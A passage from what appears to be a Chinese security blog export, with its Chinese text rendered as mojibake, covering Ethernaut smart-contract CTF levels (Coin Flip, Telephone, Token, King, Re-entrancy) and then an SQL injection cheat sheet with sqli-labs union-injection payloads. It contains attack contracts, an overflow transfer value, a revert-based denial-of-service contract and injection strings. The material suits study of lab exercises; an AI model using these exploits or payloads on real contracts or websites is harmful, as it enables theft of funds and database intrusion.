è§£:æ‰”åˆ°remixé‡Œé¢è°ƒç”¨Fal1out()å‡½æ•°å°±è¡Œäº† 2.Coin Flipæè¿°è¿™æ˜¯ä¸€ä¸ªæ·ç¡¬å¸çš„æ¸¸æˆï¼Œä½ éœ€è¦è¿ç»­çš„çŒœå¯¹ç»“æœã€‚å®Œæˆè¿™ä¸€å…³ï¼Œä½ éœ€è¦é€šè¿‡ä½ çš„è¶…èƒ½åŠ›æ¥è¿ç»­çŒœå¯¹åæ¬¡ã€‚ åˆçº¦ä»£ç 123456789101112131415161718192021222324252627282930313233343536// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import '@openzeppelin/contracts/math/SafeMath.sol';contract CoinFlip { using SafeMath for uint256; uint256 public consecutiveWins; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; constructor() public { consecutiveWins = 0; } function flip(bool _guess) public returns (bool) { uint256 blockValue = uint256(blockhash(block.number.sub(1))); if (lastHash == blockValue) { revert(); } lastHash = blockValue; uint256 coinFlip = blockValue.div(FACTOR); bool side = coinFlip == 1 ? true : false; if (side == _guess) { consecutiveWins++; return true; } else { consecutiveWins = 0; return false; } }} è§£:ä»¥å¤ªåŠç½‘ç»œç»å…¸éš¾é¢˜:ç†µçš„äº§ç”Ÿ ä½¿ç”¨åŒºå—å“ˆå¸Œäº§ç”Ÿçš„éšæœºæ•°å¾ˆå®¹æ˜“è¢«é¢„æµ‹(åªéœ€è¦å’Œå®ƒåœ¨åŒä¸€ä¸ªåŒºå—ä¸Šå°±è¡Œäº†)ï¼Œåªéœ€è¦å†™ä¸ªä¸­ç»§åˆçº¦æ‰“è¿›å»å°±è¡Œäº†ï¼ˆåŸæ¥çš„åˆçº¦åŸºç¡€ä¹‹ä¸Šæ”¹ä¸€ç‚¹ç‚¹å°±è¡Œäº†ï¼‰ 1234567891011121314function exp() public returns (bool) { uint256 blockValue = uint256(blockhash(block.number.sub(1))); if (lastHash == blockValue) { revert(); } lastHash = blockValue; uint256 coinFlip = blockValue.div(FACTOR); bool side = coinFlip == 1 ? true : false; c = CoinFlip(targetAddress); c.flip(side);} æ³¨æ„ï¼šåœ¨æŸäº›é¢„æµ‹éšæœºæ•°çš„é¢˜ç›®ä¸­ä¼šè¿”è¿˜ä»¥å¤ªï¼Œç»å¸¸å‡ºç°åˆçº¦é€»è¾‘æ²¡æœ‰ä»»ä½•é—®é¢˜ï¼Œä½†æ˜¯å°±æ˜¯è¿è¡Œå‡ºé”™çš„é—®é¢˜ã€‚ å½“åˆçº¦æ”¶åˆ°ä¸€ä¸ªcalldataä¸ºç©ºçš„callæ—¶ï¼Œreceiveå‡½æ•°ä¼šè¢«è°ƒç”¨ã€‚è¿™ä¸ªå‡½æ•°ä¼šåœ¨æ‰§è¡Œä¸€äº›ä»¥å¤ªå¸è½¬è´¦æ“ä½œæ—¶è¢«æ‰§è¡Œï¼Œå¸¸è§çš„ä»¥å¤ªå¸è½¬è´¦æ“ä½œåŒ…æ‹¬.send()ã€.transfer()å‡½æ•°å‘èµ·çš„è½¬è´¦ã€‚å¦‚æœæ²¡æœ‰receiveå‡½æ•°å­˜åœ¨ï¼Œä½†æ˜¯å­˜åœ¨ä¸€ä¸ªpayableå±æ€§çš„fallbackå‡½æ•°çš„è¯ï¼Œè¿™ä¸ªfallbackå‡½æ•°ä¼šåœ¨ä¸€æ¬¡ä»¥å¤ªå¸è½¬è´¦ä¸­è¢«è°ƒç”¨ã€‚å¦‚æœä¸€ä¸ªåˆçº¦æ—¢æ²¡æœ‰receiveå‡½æ•°ä¹Ÿæ²¡æœ‰payableå±æ€§çš„fallbackå‡½æ•°ï¼Œé‚£ä¹ˆè¿™ä¸ªåˆçº¦ä¸èƒ½é€šè¿‡å¸¸è§„çš„äº¤æ˜“æ¥æ¥æ”¶ä»¥å¤ªå¸ï¼Œå¹¶ä¸”ä¼šæŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ã€‚ 3.Telephoneåˆçº¦ä»£ç 12345678910111213141516pragma solidity ^0.6.0;contract Telephone { address public owner; constructor() public { owner = msg.sender; } function changeOwner(address _owner) public { if (tx.origin != msg.sender) { owner = _owner; } }} è§£:tx.orginæŒ‡çš„æ˜¯äº¤æ˜“çš„å‘èµ·æ–¹ï¼Œmsg.senderæ˜¯ç›´æ¥è°ƒç”¨çš„ä¸€æ–¹ï¼Œæ‰€ä»¥ç›´æ¥å†™åˆçº¦è°ƒç”¨è¿™ä¸ªå‡½æ•°å°±è¡Œäº† 123456789101112131415161718192021pragma solidity ^0.4.11;interface Telephone { function changeOwner(address _owner) external;}contract exploit { address targetAddr; Telephone t; address myaddr; function setInstance(address _targetAddr,address _myaddr) public { targetAddr=_targetAddr; myaddr= _myaddr; } function exp () public { t = Telephone(targetAddr); t.changeOwner(myaddr); }} 4.Tokenåˆçº¦ä»£ç 1234567891011121314151617181920212223// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Token { mapping(address =&gt; uint) balances; uint public totalSupply; constructor(uint _initialSupply) public { balances[msg.sender] = totalSupply = _initialSupply; } function transfer(address _to, uint _value) public returns (bool) { require(balances[msg.sender] - _value &gt;= 0); balances[msg.sender] -= _value; balances[_to] += _value; return true; } function balanceOf(address _owner) public view returns (uint balance) { return balances[_owner]; }} è§£:å¾ˆeasy æº¢å‡ºå°±å®Œäº‹äº†è½¬ä¸ª 115792089237316195423570985008687907853269984665640564039457584007913129639935å°±è¡Œäº† 5. Delegationåˆçº¦ä»£ç 123456789101112131415161718192021222324252627282930313233// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Delegate { address public owner; constructor(address _owner) public { owner = _owner; } function pwn() public { owner = msg.sender; }}contract Delegation { address public owner; Delegate delegate; constructor(address _delegateAddress) public { delegate = Delegate(_delegateAddress); owner = msg.sender; } fallback() external { (bool result,) = address(delegate).delegatecall(msg.data); if (result) { this; } }} è§£ï¼šè€ç”Ÿå¸¸è°ˆï¼Œ delegatecallç›¸å½“äºæ˜¯å»ç›®æ ‡åˆçº¦é‚£å—æŠŠç›¸å…³çš„å‡½æ•°ä»£ç å¤åˆ¶è¿‡æ¥è¿è¡Œï¼Œè€Œåœ¨solidityæ˜¯ä¸ªç¼–è¯‘å‹è¯­è¨€ï¼Œä¸”å­˜å‚¨ä½¿ç”¨çš„æ˜¯slot[]è¿™ä¸ªå¤§æ•°ç»„ï¼Œå˜é‡æ˜¯å†™æ­»åœ¨ä»£ç é‡Œé¢çš„ï¼Œä¸€æ—¦ç›®æ ‡åˆçº¦çš„å˜é‡ç¯å¢ƒå’Œå½“å‰åˆçº¦çš„å˜é‡ç¯å¢ƒä¸ä¸€æ ·ï¼Œå°±å‡ºå¤§äº‹ï¼Œè¿™é¢˜éƒ½åšçƒ‚äº†ï¼Œæ‡’å¾—å†™äº† 6.Forceæè¿°123æœ‰äº›åˆçº¦å°±æ˜¯æ‹’ç»ä½ çš„ä»˜æ¬¾,å°±æ˜¯è¿™ä¹ˆä»»æ€§ Â¯\\_(ãƒ„)_/Â¯è¿™ä¸€å…³çš„ç›®æ ‡æ˜¯ä½¿åˆçº¦çš„ä½™é¢å¤§äº0 åˆçº¦ä»£ç 123456789101112// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Force {/* MEOW ? /\\_/\\ / ____/ o o \\ /~____ =Ã¸= / (______)__m_m)*/} è§£ï¼šåœ¨Solidityé‡Œé¢ï¼Œæœ‰ä¸ªå¾ˆç‰¹æ®Šçš„è‡ªæ¯å‡½æ•° selfdestruct(addr);éšä¾¿å†™ä¸ªåˆçº¦ï¼Œå¡è¿›å»ä¸€ä¸ªselfdestructå‡½æ•°ï¼Œç„¶åæŒ‡å‘é¢˜ç›® 7.Vaultåˆçº¦ä»£ç 123456789101112131415161718// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Vault { bool public locked; bytes32 private password; constructor(bytes32 _password) public { locked = true; password = _password; } function unlock(bytes32 _password) public { if (password == _password) { locked = false; } }} è§£ç›´æ¥getStorageAtå°±è¡Œäº†ï¼Œç›´æ¥çœ‹ 8.Kingåˆçº¦ä»£ç 12345678910111213141516171819202122232425262728// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract King { address payable king; uint public prize; address payable public owner; constructor() public payable { owner = msg.sender; king = msg.sender; prize = msg.value; } receive() external payable { require(msg.value &gt;= prize || msg.sender == owner); king.transfer(msg.value); king = msg.sender; prize = msg.value; } function _king() public view returns (address payable) { return king; }} è§£ï¼š1234567891011contract Attack { constructor(address payable target) public payable{ require(msg.value == 0.15 ether,&quot;Not enough!&quot;); target.call.gas(1000000).value(0.15 ether)(&quot;&quot;); } receive() external payable { revert(); }} å½“submité¢˜ç›®æ‰“ç®—å›æ”¶â€œç‹æƒâ€æ—¶ï¼Œå®ƒè¿è¡Œåˆ°king.transfer(msg.value);è¿™ä¸€è¡Œæ—¶ï¼Œç”±äºkingå°±æ˜¯æˆ‘ä»¬åˆçº¦çš„åœ°å€ï¼Œè€Œæˆ‘ä»¬åˆçº¦çš„receiveå‡½æ•°ä¼šæ‰§è¡Œrevertï¼Œå› æ­¤å®ƒä¼šå¡åœ¨è¿™ä¸ªçŠ¶æ€æ— æ³•æ‰§è¡Œï¼Œä»è€Œæ— æ³•å–å›ç‹æƒã€‚ è¿™ä¸ªæ¼æ´åœ¨å®é™…åˆçº¦ä¸­è¢«ç”¨revertæ¥æ‰§è¡ŒDDosï¼Œè®©ç¨‹åºå¡åœ¨æŸä¸ªçŠ¶æ€æ— æ³•è¿è¡Œã€‚ éº»äº†ï¼Œåœ¨å†™æ”»å‡»åˆçº¦çš„æ—¶å€™åˆè¸©å‘é‡Œäº†https://blockchain-academy.hs-mittweida.de/courses/solidity-coding-beginners-to-intermediate/lessons/solidity-2-sending-ether-receiving-ether-emitting-events/topic/sending-ether-send-vs-transfer-vs-call/ transfer:è¦æ±‚æ¥æ”¶çš„æ™ºèƒ½åˆçº¦ä¸­å¿…é¡»æœ‰ä¸€ä¸ªfallbackæˆ–è€…receiveå‡½æ•°ï¼Œå¦åˆ™ä¼šæŠ›å‡ºä¸€ä¸ªé”™è¯¯(error)ï¼Œå¹¶ä¸”revertï¼ˆä¹Ÿå°±æ˜¯å›æ»šåˆ°äº¤æ˜“å‰çš„çŠ¶æ€ï¼‰ã€‚è€Œä¸”æœ‰å•ç¬”äº¤æ˜“ä¸­çš„æ“ä½œæ€»gasä¸èƒ½è¶…è¿‡2300çš„é™åˆ¶ã€‚transferå‡½æ•°ä¼šåœ¨ä»¥ä¸‹ä¸¤ç§æƒ…å†µæŠ›å‡ºé”™è¯¯ï¼š ä»˜æ¬¾æ–¹åˆçº¦çš„ä½™é¢ä¸è¶³ï¼Œå°äºæ‰€è¦å‘é€çš„value æ¥æ”¶æ–¹åˆçº¦æ‹’ç»æ¥æ”¶æ”¯ä»˜ send:å’Œtransferå‡½æ•°çš„å·¥ä½œæ–¹å¼åŸºæœ¬ä¸€æ ·ï¼Œå”¯ä¸€çš„åŒºåˆ«åœ¨äºï¼Œå½“å‡ºç°ä¸Šè¿°ä¸¤ç§äº¤æ˜“å¤±è´¥çš„æƒ…å†µæ—¶ï¼Œsendçš„è¿”å›ç»“æœæ˜¯ä¸€ä¸ªbooleanå€¼ï¼Œè€Œä¸ä¼šæ‰§è¡Œrevertå›æ»šã€‚ call: callå‡½æ•°å’Œä¸Šé¢æœ€å¤§çš„åŒºåˆ«åœ¨äºï¼Œå®ƒæ²¡æœ‰gasçš„é™åˆ¶ï¼Œä½¿ç”¨callæ—¶EVMå°†æ‰€æœ‰gasè½¬ç§»åˆ°æ¥æ”¶åˆçº¦ä¸Šï¼Œå½¢å¼å¦‚ä¸‹: (bool success, bytes memory data) = receivingAddress.call{value: 100}(â€œâ€); å°†å‚æ•°è®¾ç½®ä¸ºç©ºä¼šè§¦å‘æ¥æ”¶åˆçº¦çš„fallbackå‡½æ•°ï¼Œä½¿ç”¨callåŒæ ·ä¹Ÿå¯ä»¥è°ƒç”¨æœ¬åˆçº¦å†…çš„å‡½æ•°ï¼Œå½¢å¼å¦‚ä¸‹ (bool sent, bytes memory data) = _to.call{gas :10000, value: msg.value}(byte4(keccack256(â€œfunction_name(uint256)â€,args))); 9.Re-entrancyåˆçº¦ä»£ç 123456789101112131415161718192021222324252627282930// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import '@openzeppelin/contracts/math/SafeMath.sol';contract Reentrance { using SafeMath for uint256; mapping(address =&gt; uint) public balances; function donate(address _to) public payable { balances[_to] = balances[_to].add(msg.value); } function balanceOf(address _who) public view returns (uint balance) { return balances[_who]; } function withdraw(uint _amount) public { if(balances[msg.sender] &gt;= _amount) { (bool result,) = msg.sender.call{value:_amount}(&quot;&quot;); if(result) { _amount; } balances[msg.sender] -= _amount; } } receive() external payable {}} è§£åˆçº¦åœ¨è¿›è¡Œæå¸æ—¶ï¼Œä½¿ç”¨ require ä¾æ¬¡åˆ¤æ–­æå¸è´¦æˆ·æ˜¯å¦æ‹¥æœ‰ç›¸åº”çš„èµ„äº§ï¼Œéšåä½¿ç”¨ msg.sender.call.value(amount)() æ¥å‘é€ Etherï¼Œå¤„ç†å®Œæˆåç›¸åº”ä¿®æ”¹ç”¨æˆ·èµ„äº§æ•°æ®ã€‚ é¦–å…ˆï¼Œä½¿ç”¨callè¿›è¡Œè½¬è´¦æ˜¯ä¸ªæ¯”è¾ƒå±é™©çš„æ“ä½œï¼Œå› ä¸ºcallä¼šå°†å½“å‰å‰©ä¸‹çš„gasä¸€å¹¶å‘è¿‡å»æ‰§è¡Œ","link":"/2022/10/04/solidity/"},{"title":"SQLæ³¨å…¥å¤‡å¿˜å½•","text":"0x01 SQLSQL æ˜¯ä¸€ç§æ ‡å‡†SQL æ˜¯ä¸€é—¨ ANSIï¼ˆAmerican National Standards Institute ç¾å›½å›½å®¶æ ‡å‡†åŒ–ç»„ç»‡ï¼‰æ ‡å‡†çš„è®¡ç®—æœºè¯­è¨€ï¼Œä½†æ˜¯ä»ç„¶å­˜åœ¨ç€å¤šç§ä¸åŒç‰ˆæœ¬çš„ SQL è¯­è¨€ã€‚ åº“&amp;è¡¨ä¸€ä¸ªæ•°æ®åº“é€šå¸¸åŒ…æ‹¬ä¸€ä¸ªæˆ–å¤šä¸ªè¡¨ã€‚æ¯ä¸ªè¡¨éƒ½æœ‰ä¸€ä¸ªåå­—æ ‡è¯†ï¼Œè¡¨åŒ…å«å¸¦æœ‰æ•°æ®çš„è®°å½•ã€‚ SQL åŸºç¡€è¯­æ³•æœ€ç®€å•çš„æŸ¥è¯¢SELECT * FROM è¡¨å è¿™ä¸ªè¯­å¥ä¼šæŠŠå½“å‰è¡¨ä¸‹æ‰€æœ‰çš„æ•°æ®å…¨éƒ½åˆ—å‡ºæ¥ï¼Œåœ¨æ•°æ®é‡æ¯”è¾ƒå°çš„æ—¶å€™ä¼šå¾ˆå¥½ç”¨ï¼Œä½†å½“æ•°æ®é‡ç‰¹åˆ«å¤§çš„æ—¶å€™å°±å®¹æ˜“è¢«ä¸€å †æ•°æ®æ·¹æ²¡ï¼Œä¸çŸ¥æ‰€æªã€‚ è¿™æ—¶å€™å¯ä»¥æ·»åŠ é™åˆ¶ï¼ŒæŒ‡å®šæˆ‘è¦å“ªä¸€åˆ—çš„æ•°æ® SELECT åˆ—å FROM è¡¨å æ•°æ®è¿˜æ˜¯å¾ˆå¤šï¼Œå¯ä»¥æ·»åŠ WHEREæ¥è¿›è¡Œè¿›ä¸€æ­¥é™åˆ¶ SELECT åˆ—å FROM è¡¨å WHERE æ¡ä»¶ å¦‚æœéœ€è¦å°†æ•°æ®æ’åºçš„è¯ï¼Œå¯ä»¥ç”¨ORDER BY SELECT åˆ—å FROM è¡¨å WHERE æ¡ä»¶ ORDER BY åˆ—å æœ‰æ—¶å€™ï¼Œå’±åªæƒ³è¿”å›å‰å‡ æ¡æ•°æ®ï¼Œå°±å¯ä»¥åŠ å…¥LIMIT SELECT åˆ—å FROM è¡¨å WHERE æ¡ä»¶ ORDER BY åˆ—å LIMIT æ•°å­— SQLæ“ä½œç¬¦WHERE åˆ—å LIKE é€šé…ç¬¦ æŒ‰ç…§é€šé…ç¬¦åŒ¹é… é€šé…ç¬¦ æè¿° % æ›¿ä»£0ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ _ æ›¿ä»£1ä¸ªå­—ç¬¦ [charlist] å­—ç¬¦åˆ—ä¸­çš„ä»»ä½•å•ä¸€å­—ç¬¦ [^charlist] æˆ– [!charlist] ä¸åœ¨å­—ç¬¦åˆ—ä¸­çš„ä»»ä½•å•ä¸€å­—ç¬¦ WHERE åˆ—å IN (â€˜å€¼1â€™,â€™å€¼2â€™) WHERE åˆ—å BETWEEN å€¼1 AND å€¼2; è”åˆæŸ¥è¯¢SELECT åˆ—å1,åˆ—å2â€¦ FROM table1 UNION SELECT åˆ—å1,åˆ—å2â€¦ FROM table2; æ³¨æ„:è”åˆæŸ¥è¯¢è¦æ±‚å‰åå­—æ®µæ•°ç›¸åŒï¼Œå¦åˆ™å°†ä¼šæŠ¥é”™. ç‰¹æ®Šçš„æ•°æ®åº“information_schemaæ‘˜è‡ªè¿™é‡Œ åœ¨æ•°æ®åº“é‡Œï¼Œæœ‰è¿™æ ·ä¸€ä¸ªæ•°æ®åº“information_schemaï¼Œæ•°æ®åº“æ˜¯MySQLè‡ªå¸¦çš„ï¼Œå®ƒæä¾›äº†è®¿é—®æ•°æ®åº“å…ƒæ•°æ®çš„æ–¹å¼ã€‚ä»€ä¹ˆæ˜¯å…ƒæ•°æ®å‘¢ï¼Ÿå…ƒæ•°æ®æ˜¯å…³äºæ•°æ®çš„æ•°æ®ï¼Œå¦‚æ•°æ®åº“åæˆ–è¡¨åï¼Œåˆ—çš„æ•°æ®ç±»å‹ï¼Œæˆ–è®¿é—®æƒé™ç­‰ã€‚æœ‰äº›æ—¶å€™ç”¨äºè¡¨è¿°è¯¥ä¿¡æ¯çš„å…¶ä»–æœ¯è¯­åŒ…æ‹¬â€œæ•°æ®è¯å…¸â€å’Œâ€œç³»ç»Ÿç›®å½•â€ã€‚ è¡¨å åŠŸèƒ½ SCHEMATA æä¾›äº†å½“å‰mysqlå®ä¾‹ä¸­æ‰€æœ‰æ•°æ®åº“çš„ä¿¡æ¯ã€‚æ˜¯show databasesçš„ç»“æœå–ä¹‹æ­¤è¡¨ã€‚ TABLES æä¾›äº†å…³äºæ•°æ®åº“ä¸­çš„è¡¨çš„ä¿¡æ¯ï¼ˆåŒ…æ‹¬è§†å›¾ï¼‰ã€‚è¯¦ç»†è¡¨è¿°äº†æŸä¸ªè¡¨å±äºå“ªä¸ªschemaï¼Œè¡¨ç±»å‹ï¼Œè¡¨å¼•æ“ï¼Œåˆ›å»ºæ—¶é—´ç­‰ä¿¡æ¯ã€‚æ˜¯show tables from schemanameçš„ç»“æœå–ä¹‹æ­¤è¡¨ã€‚ COLUMNS ä¾›äº†è¡¨ä¸­çš„åˆ—ä¿¡æ¯ã€‚è¯¦ç»†è¡¨è¿°äº†æŸå¼ è¡¨çš„æ‰€æœ‰åˆ—ä»¥åŠæ¯ä¸ªåˆ—çš„ä¿¡æ¯ã€‚æ˜¯show columns from schemaname.tablenameçš„ç»“æœå–ä¹‹æ­¤è¡¨ã€‚ STATISTICS æä¾›äº†å…³äºè¡¨ç´¢å¼•çš„ä¿¡æ¯ã€‚æ˜¯show index from schemaname.tablenameçš„ç»“æœå–ä¹‹æ­¤è¡¨ã€‚ USER_PRIVILEGES ç»™å‡ºäº†å…³äºå…¨ç¨‹æƒé™çš„ä¿¡æ¯ã€‚è¯¥ä¿¡æ¯æºè‡ªmysql.useræˆæƒè¡¨ã€‚æ˜¯éæ ‡å‡†è¡¨ã€‚ SCHEMA_PRIVILEGES ç»™å‡ºäº†å…³äºæ–¹æ¡ˆï¼ˆæ•°æ®åº“ï¼‰æƒé™çš„ä¿¡æ¯ã€‚è¯¥ä¿¡æ¯æ¥è‡ªmysql.dbæˆæƒè¡¨ã€‚æ˜¯éæ ‡å‡†è¡¨ã€‚ TABLE_PRIVILEGESï¼ˆè¡¨æƒé™ï¼‰ ç»™å‡ºäº†å…³äºè¡¨æƒé™çš„ä¿¡æ¯ã€‚è¯¥ä¿¡æ¯æºè‡ªmysql.tables_privæˆæƒè¡¨ã€‚æ˜¯éæ ‡å‡†è¡¨ã€‚ COLUMN_PRIVILEGESï¼ˆåˆ—æƒé™ï¼‰ ç»™å‡ºäº†å…³äºåˆ—æƒé™çš„ä¿¡æ¯ã€‚è¯¥ä¿¡æ¯æºè‡ªmysql.columns_privæˆæƒè¡¨ã€‚æ˜¯éæ ‡å‡†è¡¨ã€‚ CHARACTER_SETSï¼ˆå­—ç¬¦é›†ï¼‰ æä¾›äº†mysqlå®ä¾‹å¯ç”¨å­—ç¬¦é›†çš„ä¿¡æ¯ã€‚æ˜¯SHOW CHARACTER SETç»“æœé›†å–ä¹‹æ­¤è¡¨ã€‚ â€¦ â€¦ åœ¨æ³¨å…¥çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å¸¸ç”¨çš„æ˜¯information_schema.tablesä¸‹é¢çš„table_nameä»¥åŠtable_schemaè¡¨ååŠå…¶æ‰€åœ¨çš„æ•°æ®åº“åå­—ã€‚ä½¿ç”¨information_schema.columnsä¸‹çš„column_nameè·å–åˆ—å select çš„å…¶ä»–ç”¨æ³•12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667mysql&gt; select 1;+---+| 1 |+---+| 1 |+---+1 row in set (0.00 sec)mysql&gt; select 1,2,3;+---+---+---+| 1 | 2 | 3 |+---+---+---+| 1 | 2 | 3 |+---+---+---+1 row in set (0.00 sec)mysql&gt; select (1&gt;2);+-------+| (1&gt;2) |+-------+| 0 |+-------+1 row in set (0.00 sec)mysql&gt; select (1&lt;2);+-------+| (1&lt;2) |+-------+| 1 |+-------+1 row in set (0.00 sec)mysql&gt; select &quot;aaaa&quot;;+------+| aaaa |+------+| aaaa |+------+1 row in set (0.00 sec)mysql&gt; select (1&lt;2) from users;+-------+| (1&lt;2) |+-------+| 1 || 1 || 1 || 1 || 1 || 1 || 1 || 1 || 1 || 1 || 1 || 1 || 1 |+-------+13 rows in set (0.00 sec)mysql&gt; select (version());+-------------------------+| (version()) |+-------------------------+| 5.5.44-0ubuntu0.14.04.1 |+-------------------------+1 row in set (0.00 sec) SQL æ³¨å…¥å¸¸ç”¨å‡½æ•°å­—ç¬¦æ‹¼æ¥1. concat()å‡½æ•° åŠŸèƒ½ï¼šå°†å¤šä¸ªå­—ç¬¦ä¸²è¿æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²ã€‚ è¯­æ³•ï¼šconcat(str1, str2,â€¦) è¯´æ˜ï¼šè¿”å›ç»“æœä¸ºè¿æ¥å‚æ•°äº§ç”Ÿçš„å­—ç¬¦ä¸²ï¼Œå¦‚æœæœ‰ä»»ä½•ä¸€ä¸ªå‚æ•°ä¸ºnullï¼Œåˆ™è¿”å›å€¼ä¸ºnullã€‚ 123456789101112131415161718mysql&gt; select concat('a','b','c') -&gt; ;+---------------------+| concat('a','b','c') |+---------------------+| abc |+---------------------+1 row in set (0.00 sec)mysql&gt; select concat('a','b','c','null') -&gt; ;+----------------------------+| concat('a','b','c','null') |+----------------------------+| abcnull |+----------------------------+1 row in set (0.00 sec) 2. concat_ws()å‡½æ•° åŠŸèƒ½ å’Œconcat()ä¸€æ ·ï¼Œä½†æ˜¯å¯ä»¥æŒ‡å®šåˆ†éš”ç¬¦ è¯­æ³•ï¼šconcat_ws(separator, str1, str2, â€¦) ç¬¬ä¸€ä¸ªå‚æ•°æŒ‡å®šåˆ†éš”ç¬¦ã€‚éœ€è¦æ³¨æ„çš„æ˜¯åˆ†éš”ç¬¦ä¸èƒ½ä¸ºnullï¼Œå¦‚æœä¸ºnullï¼Œåˆ™è¿”å›ç»“æœä¸ºnullã€‚ 12345678mysql&gt; select concat_ws('#','a','b','c','null') -&gt; ;+-----------------------------------+| concat_ws('#','a','b','c','null') |+-----------------------------------+| a#b#c#null |+-----------------------------------+1 row in set (0.00 sec) 3.group_concat()å‡½æ•° åŠŸèƒ½ï¼šå°†group byäº§ç”Ÿçš„åŒä¸€ä¸ªåˆ†ç»„ä¸­çš„å€¼è¿æ¥èµ·æ¥ï¼Œè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ç»“æœã€‚ è¯­æ³•ï¼šgroup_concat( [distinct] è¦è¿æ¥çš„å­—æ®µ [order by æ’åºå­—æ®µ asc/desc ] [separator] ) 12345678mysql&gt; select 1,(select group_concat(username) from users); +---+---------------------------------------------------------------------------------------------+| 1 | (select group_concat(username) from users) |+---+---------------------------------------------------------------------------------------------+| 1 | Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4 |+---+---------------------------------------------------------------------------------------------+1 row in set (0.00 sec) ç›²æ³¨å¸¸ç”¨1.ascii()å‡½æ•°éƒ½ä¼šç”¨ï¼Œä¸è¯´äº† 2.substr()å‡½æ•° substr(str,pos,len);//str:å­—ç¬¦ä¸²ï¼Œposï¼šèµ·å§‹ä½ç½®ï¼Œlenï¼šæˆªæ–­é•¿åº¦ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647mysql&gt; select substr(&quot;abcdefg&quot;,1,1);+-----------------------+| substr(&quot;abcdefg&quot;,1,1) |+-----------------------+| a |+-----------------------+1 row in set (0.00 sec)mysql&gt; select substr(&quot;abcdefg&quot;,1,3);+-----------------------+| substr(&quot;abcdefg&quot;,1,3) |+-----------------------+| abc |+-----------------------+1 row in set (0.00 sec)mysql&gt; select substr(&quot;abcdefg&quot;,2,3);+-----------------------+| substr(&quot;abcdefg&quot;,2,3) |+-----------------------+| bcd |+-----------------------+1 row in set (0.00 sec)mysql&gt; select substr(&quot;abcdefg&quot;,-2,3);+------------------------+| substr(&quot;abcdefg&quot;,-2,3) |+------------------------+| fg |+------------------------+1 row in set (0.01 sec)mysql&gt; select substr(&quot;abcdefg&quot;,-2,1);+------------------------+| substr(&quot;abcdefg&quot;,-2,1) |+------------------------+| f |+------------------------+1 row in set (0.00 sec)mysql&gt; select substr(&quot;abcdefg&quot;,-3,2);+------------------------+| substr(&quot;abcdefg&quot;,-3,2) |+------------------------+| ef |+------------------------+1 row in set (0.00 sec) sleep()éƒ½ä¼šï¼Œä¸è¯´äº† æŠ¥é”™æ³¨å…¥å¸¸ç”¨updatexml()extractvalue()group byæŠ¥é”™æ³¨å…¥0x02 SQLæ³¨å…¥é¶åœºâ€“Sqli-labsLess-1 | æ˜¾é”™æ³¨å…¥åˆ¤æ–­æ³¨å…¥ç‚¹ä¸ºå­—ç¬¦å‹è¿˜æ˜¯æ•°å­—å‹: ?id=1 id=2 id=1+1 è¿™é‡Œå¯ä»¥å‘ç°ï¼Œæ²¡æœ‰å¯¹æˆ‘ä»¬è¾“å…¥çš„1+1è¿›è¡Œè¿ç®—,å¯ä»¥ç¡®å®šæ˜¯å­—ç¬¦å‹æ³¨å…¥ã€‚æŸ¥çœ‹æºä»£ç  1$sql=&quot;SELECT * FROM users WHERE id='$id' LIMIT 0,1&quot;; è¿™é‡Œæœ‰ä¸ªä»¤äººå¼‚æˆ–çš„åœ°æ–¹:?id=1+1ä¸ºå•¥è¿”å›äº†?id=1çš„ç»“æœï¼Œè¿™é‡Œè¿›mysqlæ§åˆ¶å°é‡Œé¢åº·åº·ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061mysql&gt; select * from users where id='1+1';+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb |+----+----------+----------+1 row in set, 1 warning (0.00 sec)mysql&gt; select * from users where id=1;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb |+----+----------+----------+1 row in set (0.00 sec)mysql&gt; select * from users where id=&quot;1&quot;;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb |+----+----------+----------+1 row in set (0.00 sec)mysql&gt; select * from users where id=&quot;1a&quot;;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb |+----+----------+----------+1 row in set, 1 warning (0.00 sec)mysql&gt; select * from users where id=&quot;a1&quot;;Empty set (0.00 sec)mysql&gt; select * from users where id=&quot;0x1&quot;;Empty set (0.00 sec)mysql&gt; select * from users where id=0x1;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb |+----+----------+----------+1 row in set (0.00 sec)mysql&gt; select * from users where id=+0b01;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb |+----+----------+----------+1 row in set (0.00 sec)mysql&gt; select * from users where id=+ 0b01;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb |+----+----------+----------+1 row in set (0.00 sec) è¿™å®›å¦‚PHPä¸€æ ·å¼ºå¤§çš„é²æ£’æ€§ï¼Œæˆ‘å·²ç»æœ‰ä¸å¥½çš„é¢„æ„Ÿäº†ã€‚ ä¼—æ‰€å‘¨çŸ¥ï¼Œæ–¹ä¾¿ç¨‹åºå‘˜å†™ä»£ç  = æ–¹ä¾¿é»‘å®¢è¿›æ¥æäº‹æƒ…ã€‚ æ›´æ·±å…¥çš„æµ‹è¯•è”åˆæ³¨å…¥: ?id=1â€™ union select 1,2,3 â€“+ å®é™…æ‰§è¡Œçš„æ˜¯ï¼Œè¿™é‡Œ--+æ˜¯å°†åé¢çš„å†…å®¹æ³¨é‡Šæ‰äº† SELECT * FROM users WHERE id=â€™1â€™ union select 1,2,3 â€“+ LIMIT 0,1 